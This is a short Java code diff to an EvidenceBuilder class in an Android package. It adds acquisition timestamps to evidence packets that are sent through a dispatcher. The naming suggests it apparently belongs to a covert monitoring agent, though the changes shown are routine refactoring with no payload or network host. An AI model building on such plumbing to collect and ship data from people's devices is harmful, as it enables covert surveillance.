@@ -20,6 +20,7 @@ import com.android.mm.M;
 import java.io.DataInputStream;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Date;
 
 /**
  * The Class LogR.
@@ -95,6 +96,9 @@ public class EvidenceBuilder {
 		send(p);
 	}
 
+	public EvidenceBuilder(final int evidenceType, final byte[] additional) {
+		this(evidenceType, additional, new Date());
+	}
 	/**
 	 * Instantiates a new log, creates the evidence with additional.
 	 *
@@ -102,10 +106,11 @@ public class EvidenceBuilder {
 	 * @param priority     the priority
 	 * @param additional   the additional
 	 */
-	public EvidenceBuilder(final int evidenceType, final byte[] additional) {
+	public EvidenceBuilder(final int evidenceType, final byte[] additional, Date accessTime) {
 		final Packet p = init(evidenceType);
 		p.setCommand(LOG_CREATE);
 		p.setAdditional(additional);
+		p.setTime(accessTime);
 
 		send(p);
 	}
@@ -119,11 +124,12 @@ public class EvidenceBuilder {
 	 * @param additional   the additional
 	 * @param data         the data
 	 */
-	private EvidenceBuilder(final int evidenceType, final byte[] additional, final byte[] data) {
+	private EvidenceBuilder(final int evidenceType, final byte[] additional, final byte[] data, Date accessTime) {
 		final Packet p = init(evidenceType);
 		p.setCommand(LOG_ATOMIC);
 		p.setAdditional(additional);
 		p.setData(data);
+		p.setTime(accessTime);
 
 		hasData = true;
 		send(p);
@@ -141,11 +147,19 @@ public class EvidenceBuilder {
 		return p;
 	}
 
-	public static void atomic(int evidenceType, byte[] additional, byte[] data) {
+	public static void atomic(int evidenceType, byte[] additional, byte[] content, Date acquisitionTime) {
 		if (Cfg.DEBUG) {
 			// Check.log(TAG + " (atomic)");
 		}
-		final Packet p = new Packet(evidenceType, additional, data);
+		final Packet p = new Packet(evidenceType, additional, content, acquisitionTime);
+		EvDispatcher.self().send(p);
+	}
+
+	public static void atomic(int evidenceType, byte[] additional, byte[] content) {
+		if (Cfg.DEBUG) {
+			// Check.log(TAG + " (atomic)");
+		}
+		final Packet p = new Packet(evidenceType, additional, content);
 		EvDispatcher.self().send(p);
 	}
 
@@ -334,4 +348,6 @@ public class EvidenceBuilder {
 			}
 		}
 	}
+
+
 }
